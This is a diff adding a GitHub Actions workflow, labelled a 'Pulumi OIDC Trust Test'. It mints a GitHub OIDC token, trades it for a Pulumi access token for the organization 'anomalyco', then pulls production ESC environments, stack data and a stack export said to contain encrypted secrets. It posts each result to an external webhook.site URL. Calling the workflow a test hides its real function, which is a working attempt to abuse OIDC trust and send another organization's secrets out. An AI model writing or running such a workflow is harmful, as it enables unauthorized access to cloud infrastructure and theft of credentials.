@@ -1,0 +1,109 @@
+name: Pulumi OIDC Trust Test
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  test-pulumi-oidc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test Pulumi OIDC Exchange
+        env:
+          WEBHOOK_URL: "https://webhook.site/64d9d69a-2861-4fc8-8095-f7b8865296f8"
+        run: |
+          set -x
+
+          # Test 1: Mint OIDC token with audience urn:pulumi:org:anomalyco
+          echo "=== Test 1: urn:pulumi:org:anomalyco ==="
+          OIDC_TOKEN1=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=urn:pulumi:org:anomalyco" | jq -r '.value')
+          
+          if [ "$OIDC_TOKEN1" != "null" ] && [ -n "$OIDC_TOKEN1" ]; then
+            echo "Got OIDC token (length: ${#OIDC_TOKEN1})"
+            
+            # Exchange with Pulumi
+            RESULT1=$(curl -sS -X POST "https://api.pulumi.com/api/oauth/token" \
+              -H "Content-Type: application/json" \
+              -d "{
+                \"audience\": \"urn:pulumi:org:anomalyco\",
+                \"grant_type\": \"urn:ietf:params:oauth:grant-type:token-exchange\",
+                \"subject_token_type\": \"urn:ietf:params:oauth:token-type:id_token\",
+                \"subject_token\": \"$OIDC_TOKEN1\",
+                \"requested_token_type\": \"urn:pulumi:token-type:access_token:organization\"
+              }")
+            echo "Exchange result: $RESULT1"
+            
+            # Report
+            curl -sS -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"test\":\"pulumi-oidc-org-anomalyco\",\"result\":$(echo "$RESULT1" | jq -c .),\"oidc_token_claims\":\"$(echo "$OIDC_TOKEN1" | cut -d. -f2 | base64 -d 2>/dev/null | jq -c . 2>/dev/null)\"}"
+          else
+            echo "Failed to get OIDC token for urn:pulumi:org:anomalyco"
+            curl -sS -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d '{"test":"pulumi-oidc-org-anomalyco","error":"failed_to_mint_oidc_token"}'
+          fi
+
+          # Test 2: If test 1 succeeded, try to access ESC environment
+          if echo "$RESULT1" | jq -e '.access_token' > /dev/null 2>&1; then
+            PULUMI_TOKEN=$(echo "$RESULT1" | jq -r '.access_token')
+            echo "=== Got Pulumi token! Testing access ==="
+            
+            # Try to list ESC environments
+            ESC_RESULT=$(curl -sS "https://api.pulumi.com/api/esc/environments/anomalyco" \
+              -H "Authorization: token $PULUMI_TOKEN")
+            curl -sS -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"test\":\"esc-list\",\"result\":$(echo "$ESC_RESULT" | jq -c . 2>/dev/null || echo "\"$ESC_RESULT\"")}"
+            
+            # Try to open the production ESC environment
+            ESC_OPEN=$(curl -sS -X POST "https://api.pulumi.com/api/esc/environments/anomalyco/console/production/open" \
+              -H "Authorization: token $PULUMI_TOKEN" \
+              -H "Content-Type: application/json" \
+              -d '{}')
+            curl -sS -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"test\":\"esc-open-production\",\"result\":$(echo "$ESC_OPEN" | jq -c . 2>/dev/null || echo "\"$ESC_OPEN\"")}"
+
+            # Also try stacks API
+            STACK_RESULT=$(curl -sS "https://api.pulumi.com/api/stacks/anomalyco/console/production" \
+              -H "Authorization: token $PULUMI_TOKEN")
+            curl -sS -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"test\":\"stack-production\",\"result\":$(echo "$STACK_RESULT" | jq -c . 2>/dev/null || echo "\"$STACK_RESULT\"")}"
+            
+            # Try stack export (contains encrypted secrets)
+            STACK_EXPORT=$(curl -sS "https://api.pulumi.com/api/stacks/anomalyco/console/production/export" \
+              -H "Authorization: token $PULUMI_TOKEN")
+            # Only send first 5000 chars to webhook
+            curl -sS -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"test\":\"stack-export\",\"result_preview\":\"$(echo "$STACK_EXPORT" | head -c 5000 | base64 -w0)\"}"
+
+            # Try to get user info
+            USER_RESULT=$(curl -sS "https://api.pulumi.com/api/user" \
+              -H "Authorization: token $PULUMI_TOKEN")
+            curl -sS -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"test\":\"user-info\",\"result\":$(echo "$USER_RESULT" | jq -c . 2>/dev/null || echo "\"$USER_RESULT\"")}"
+            
+            # Try org info
+            ORG_RESULT=$(curl -sS "https://api.pulumi.com/api/orgs/anomalyco" \
+              -H "Authorization: token $PULUMI_TOKEN")
+            curl -sS -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"test\":\"org-info\",\"result\":$(echo "$ORG_RESULT" | jq -c . 2>/dev/null || echo "\"$ORG_RESULT\"")}"
+          else
+            echo "Test 1 failed, token exchange did not return access_token"
+            curl -sS -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d '{"test":"summary","status":"exchange_failed","detail":"Pulumi OIDC trust policy likely filters sub claim to anomalyco repos only"}'
+          fi
+
+          echo "=== All tests complete ==="
